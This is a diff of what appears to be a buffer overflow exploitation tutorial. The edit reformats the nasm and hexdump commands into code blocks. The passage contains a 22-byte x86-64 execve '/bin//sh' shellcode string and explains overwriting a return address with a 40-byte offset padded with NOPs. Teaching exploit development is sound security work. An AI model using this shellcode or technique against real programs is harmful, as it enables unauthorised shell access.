@@ -178,11 +178,14 @@ syscal
 ```
 
 We can assemble the instructions with nasm:
- nasm -fbin shellcode.nasm -o sc.bin
-
+```
+nasm -fbin shellcode.nasm -o sc.bin
+```
 And generate a python friendly shellcode with hexdump:
- hexdump -v -e '"\\x" 1/1 "%02X" ' sc.bin
- \x6A\x3B\x58\x99\x52\x5E\x48\xB9\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x52\x51\x54\x5F\x0F\x05
+```
+hexdump -v -e '"\\x" 1/1 "%02X" ' sc.bin
+\x6A\x3B\x58\x99\x52\x5E\x48\xB9\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x52\x51\x54\x5F\x0F\x05
+```
 
 Since we need to overwrite the return address at 0x7fffffffe368 we need an offset of 40 bytes, our shellcode
 length is 22 bytes we need 18 bytes to complete our offset we will just nop instructions \x90 to fill the
